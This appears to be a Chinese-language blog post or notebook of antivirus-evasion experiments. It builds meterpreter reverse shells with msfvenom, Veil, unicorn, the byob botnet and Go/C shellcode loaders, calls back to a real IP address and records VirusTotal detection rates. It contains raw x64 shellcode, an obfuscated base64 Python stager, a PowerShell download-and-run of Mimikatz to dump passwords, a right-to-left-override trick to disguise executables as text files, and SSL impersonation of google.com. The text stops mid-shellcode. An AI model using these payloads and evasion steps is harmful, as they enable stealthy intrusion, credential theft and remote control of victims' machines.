<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Veil&gt;: use 1</span><br><span class="line"></span><br><span class="line">Veil-Evasion <span class="built_in">command</span>: use 7        <span class="comment">#选择payload  c/meterpreter/rev_tcp.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost 45.32.137.154</span><br><span class="line"><span class="built_in">set</span> lport 4466</span><br><span class="line">generate</span><br></pre></td></tr></table></figure>

<p>用mingw-w64来编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc c_msf.c -o c_msf.exe -l ws2_32</span><br></pre></td></tr></table></figure>

<p>火绒查杀exe文件</p>
<p>upx加壳后（火绒未查杀）       virustotal查杀率         7&#x2F;68</p>
<p>msf收到的弹回的shell无法执行命令？失败品。</p>
<p>msfconsole -r 加载.rc文件</p>
<h3 id="msf-apk"><a href="#msf-apk" class="headerlink" title="msf apk"></a>msf apk</h3><p>virustotal查杀率        29&#x2F;63</p>
<p>未免杀时被查杀比例       57&#x2F;72</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=45.32.137.154 LPORT=5566 R &gt; test.apk</span><br></pre></td></tr></table></figure>

<p>shellter免杀无效，免杀后exe文件原功能无法使用</p>
<h3 id="msfvenom-捆绑-编码器免杀"><a href="#msfvenom-捆绑-编码器免杀" class="headerlink" title="msfvenom 捆绑+编码器免杀"></a>msfvenom 捆绑+编码器免杀</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b <span class="string">&#x27;\x00&#x27;</span> lhost=45.32.137.154 lport=5566 -f exe -o en20.exe</span><br></pre></td></tr></table></figure>

<p>x86&#x2F;shikata_ga_nai编码器免杀后查杀比例       57&#x2F;72        加编码器完全无效没卵用</p>
<p>shikata_ga_nai编码+upx加壳免杀后查杀比例     52&#x2F;72        查杀比例降低了一点</p>
<h3 id="尝试byob僵尸网络-python2"><a href="#尝试byob僵尸网络-python2" class="headerlink" title="尝试byob僵尸网络(python2)"></a>尝试byob僵尸网络(python2)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python client.py 45.32.137.154 5566 --name <span class="built_in">test</span> --compress --freeze --icon tom.jpg</span><br><span class="line"></span><br><span class="line">hosting payload at: http://45.32.137.154:5567///payloads/m8V.py</span><br><span class="line">hosting stager at: http://45.32.137.154:5567///stagers/m8V.py</span><br></pre></td></tr></table></figure>

<p>生成payload的目录在\modules文件夹下，两个文件夹，一个payload，一个stager，直接把两个文件夹，复制到kali里面的byob&#x2F;byob&#x2F;module里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python server.py --host 45.32.137.154 --port 5566</span><br></pre></td></tr></table></figure>

<p>此时服务器已经搭建起来了，接下来我们只需要再另外一个窗口随便生成一个木马，让byob帮我们搭建网站服务器来存储payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python client.py 45.32.137.154 5566 --name test1 --compress --freeze --icon tom.jpg</span><br><span class="line"></span><br><span class="line">hosting payload at: http://45.32.137.154:5567//payloads/nBa.py</span><br><span class="line"></span><br><span class="line">hosting stager at: http://45.32.137.154:5567//stagers/nBa.py</span><br></pre></td></tr></table></figure>

<p>服务启动成功，然后把在windows生成的payload和stager放到属于他们自己的目录（不要乱了啊）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload：./byob/byob/modules/payloads</span><br><span class="line"></span><br><span class="line">stagers：./byob/byob/modules/stagers</span><br><span class="line"></span><br><span class="line">http://45.32.137.154:5567//payloads/yCN.py</span><br><span class="line"></span><br><span class="line">http://45.32.137.154:5567//stagers/yCN.py</span><br></pre></td></tr></table></figure>

<p>运行exe或者test.py文件</p>
<p>python2实验生成的exe或者py文件能过大部分免杀，但是实验用的目标机器在内网，外网没有session上线，外网没测试</p>
<p>byob查杀比例          5&#x2F;72</p>
<h3 id="unicron"><a href="#unicron" class="headerlink" title="unicron"></a>unicron</h3><p>免杀比例   19&#x2F;72</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python unicorn.py windows/meterpreter/reverse_https 45.32.137.154 443</span><br></pre></td></tr></table></figure>

<p>会在unicorn目录下生成两个文件: unicorn.rc和powershell_attack.txt，后者是我们需要在目标机上运行的。</p>
<p>转成bat格式，然后下载win10的icon图标：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> <span class="string">&#x27;https://github.com/B00merang-Project/Windows-10-Icons&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>后缀名欺骗</li>
</ul>
<p>这里选择Windows-10-Icons&#x2F;256x256&#x2F;mimetypes&#x2F; 下的text-x-generic.png去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://convertico.com/</span><br></pre></td></tr></table></figure>
<p>网站转化PNG图片为ICON，然后打开BAT2EXE转换器，打开powershell_attack.bat然后在顶部加上notepad:</p>
<p>保存为windows 64位invisible的text.exe</p>
<p>然后伪装文件后缀名。<br>先把文件名改为texttxt.exe, 然后去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://unicode-table.com/en/202E/</span><br></pre></td></tr></table></figure>
<p>复制倒写unicode，文件名就变成了textexe.txt,但实际是一个可执行文件，这招能骗过开启文件后缀名显示的目标机用户。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r unicorn.rc</span><br><span class="line"></span><br><span class="line">load stdapi</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>shell无法弹出到外网vps？</p>
<h3 id="gobindshell-（success）"><a href="#gobindshell-（success）" class="headerlink" title="gobindshell  （success）"></a>gobindshell  （success）</h3><p>免杀比例     2&#x2F;69</p>
<h3 id="go-shellcode"><a href="#go-shellcode" class="headerlink" title="go-shellcode"></a>go-shellcode</h3><p>编译生成的exe被查杀</p>
<p>+upx    体积缩小一半    过火绒</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=45.32.137.154 LPORT=2234</span><br></pre></td></tr></table></figure>

<p>能免杀，但是内存加载失败没弹回shell？</p>
<h3 id="shellcode-launcher-x"><a href="#shellcode-launcher-x" class="headerlink" title="shellcode-launcher(x)"></a>shellcode-launcher(x)</h3><p>c++加载shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b <span class="string">&#x27;\x00&#x27;</span> lhost=45.32.137.154 lport=2234 -f raw -o shellcode.raw</span><br></pre></td></tr></table></figure>

<p>upx之后还是被火绒查杀</p>
<h3 id="k8-scrun"><a href="#k8-scrun" class="headerlink" title="k8 scrun"></a>k8 scrun</h3><p>python加载shellcode</p>
<p>加upx后未报毒</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b <span class="string">&#x27;\x00&#x27;</span> lhost=45.32.137.154 lport=2234 -f c -o shell.c</span><br></pre></td></tr></table></figure>

<p>生成的shell.c文件还需要hex编码</p>
<p>scrun.exe运行时退出，程序运行有问题</p>
<h3 id="go-meterpreter"><a href="#go-meterpreter" class="headerlink" title="go_meterpreter"></a>go_meterpreter</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2luc2lnaHRnbGFjaWVyL2dvX21ldGVycHJldGVy">https://github.com/insightglacier/go_meterpreter<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">go build -ldflags=<span class="string">&quot;-H windowsgui -w&quot;</span> .\go_meterpreter.go</span><br><span class="line"></span><br><span class="line">此命令编译的程序会sessions die</span><br><span class="line"></span><br><span class="line">go build .\go_meterpreter.go</span><br><span class="line"></span><br><span class="line">同样会die</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LHOST  45.32.137.154    <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">LPORT  2234             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>+upx之后查杀比例：           9&#x2F;71</p>
<p>缺点是弹外网时会session die, 内网未测试</p>
<h3 id="powershell远程加载mimikatz读取密码"><a href="#powershell远程加载mimikatz读取密码" class="headerlink" title="powershell远程加载mimikatz读取密码"></a>powershell远程加载mimikatz读取密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>); Invoke-Mimikatz &gt;&gt; c:\1.txt</span><br></pre></td></tr></table></figure>

<h3 id="SimpleShellcodeInjector加载器"><a href="#SimpleShellcodeInjector加载器" class="headerlink" title="SimpleShellcodeInjector加载器"></a>SimpleShellcodeInjector加载器</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RpbW9wb3Vsb3NFbGlhcy9TaW1wbGVTaGVsbGNvZGVJbmplY3Rvcg==">https://github.com/DimopoulosElias/SimpleShellcodeInjector<i class="fa fa-external-link-alt"></i></span></p>
<p>火绒报毒，upx加壳和不加壳程序运行闪退</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe</span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_https LHOST=45.32.137.154 LPORT=2234 -f c -o msf.txt</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 545 bytes</span><br><span class="line">Final size of c file: 2315 bytes</span><br><span class="line">Saved as: msf.txt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> msf.txt|grep -v unsigned|sed <span class="string">&quot;s/\&quot;\\\x//g&quot;</span>|sed <span class="string">&quot;s/\\\x//g&quot;</span>|sed <span class="string">&quot;s/\&quot;//g&quot;</span>|sed <span class="string">&#x27;:a;N;$!ba;s/\n//g&#x27;</span>|sed <span class="string">&quot;s/;//g&quot;</span></span><br></pre></td></tr></table></figure>

<p>msf:</p>
<p>SSL impersonation:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf exploit(multi/handler) &gt; use auxiliary/gather/impersonate_ssl</span><br><span class="line">msf auxiliary(gather/impersonate_ssl) &gt; <span class="built_in">set</span> RHOST www.google.com</span><br><span class="line">RHOST =&gt; www.google.com</span><br><span class="line">sf auxiliary(gather/impersonate_ssl) &gt; run</span><br><span class="line"></span><br><span class="line">[*] www.google.com:443 - Connecting to www.google.com:443</span><br><span class="line">[*] www.google.com:443 - Copying certificate from www.google.com:443</span><br><span class="line">/C=US/ST=California/L=Mountain View/O=Google LLC/CN=www.google.com </span><br><span class="line">[*] www.google.com:443 - Beginning <span class="built_in">export</span> of certificate files</span><br><span class="line">[*] www.google.com:443 - Creating looted key/crt/pem files <span class="keyword">for</span> www.google.com:443</span><br><span class="line">[+] www.google.com:443 - key: /home/gweeperx/.msf4/loot/20180816131826_default_216.58.212.36_www.google.com_k_829605.key</span><br><span class="line">[+] www.google.com:443 - crt: /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_c_997519.crt</span><br><span class="line">[+] www.google.com:443 - pem: /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_p_032017.pem</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>Handler:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(gather/impersonate_ssl) &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> HandlerSSLCert /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_p_032017.pem</span><br><span class="line">HandlerSSLCert =&gt; /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_p_032017.pem</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line">LHOST =&gt; 0.0.0.0</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443</span><br></pre></td></tr></table></figure>

<h3 id="py加载"><a href="#py加载" class="headerlink" title="py加载"></a>py加载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">base64</span>,sys</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()</span><br><span class="line"><span class="keyword">if</span> whnd != 0:</span><br><span class="line">    ctypes.windll.user32.ShowWindow(whnd, 0)</span><br><span class="line">    ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,<span class="string">&#x27;UTF-8&#x27;</span>)&#125;[sys.version_info[0]](<span class="string">&#x27;aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzQ1LjMyLjEzNy4xNTQnLDIyMzQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSk=&#x27;</span>)))</span><br></pre></td></tr></table></figure>

<p>base64 decode之后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import socket,struct,time</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(10):</span><br><span class="line">	try:</span><br><span class="line">		s=socket.socket(2,socket.SOCK_STREAM)</span><br><span class="line">		s.connect((&#x27;<span class="number">45.32</span>.<span class="number">137.154</span>&#x27;,<span class="number">2234</span>))</span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	except:</span><br><span class="line">		time.sleep(5)</span><br><span class="line">l=struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,s.recv(4))[0]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> len(d)&lt;l:</span><br><span class="line">	d+=s.recv(l-len(d))</span><br><span class="line"><span class="built_in">exec</span>(d,&#123;<span class="string">&#x27;s&#x27;</span>:s&#125;)</span><br></pre></td></tr></table></figure>

<p>能连上，执行不了命令，需要另外改代码？</p>
<h3 id="go内联c加载-go嵌入shellcode"><a href="#go内联c加载-go嵌入shellcode" class="headerlink" title="go内联c加载+go嵌入shellcode"></a>go内联c加载+go嵌入shellcode</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9mZjI0YTgxZjM2Mzc=">windows 下 gcc&#x2F;g++ 的安装<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>goshell（success）</li>
</ul>
<p>查杀比例         15&#x2F;64</p>
<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.32.137.154 lport&#x3D;2234 -f c</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x08\xba\x2d\x20\x89\x9a\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span></span><br></pre></td></tr></table></figure>

<p>go build -ldflags&#x3D;”-H windowsgui -w”</p>
<p>源码见goshell</p>
<p>+upx壳后外网msf成功上线</p>
<ul>
<li>cingo</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21lY2hvL2FydGljbGUvZGV0YWlscy8yNDMwNTM2OQ==">64 bit gcc install<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qbWV1YmFuay5naXRodWIuaW8vdGRtLWdjYy9hcnRpY2xlcy8yMDIwLTAzLzkuMi4wLXJlbGVhc2U=">64 bit gcc<i class="fa fa-external-link-alt"></i></span></p>
<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.32.137.154 lport&#x3D;2234 -f c</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x08\xba\x2d\x20\x89\x9a\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span 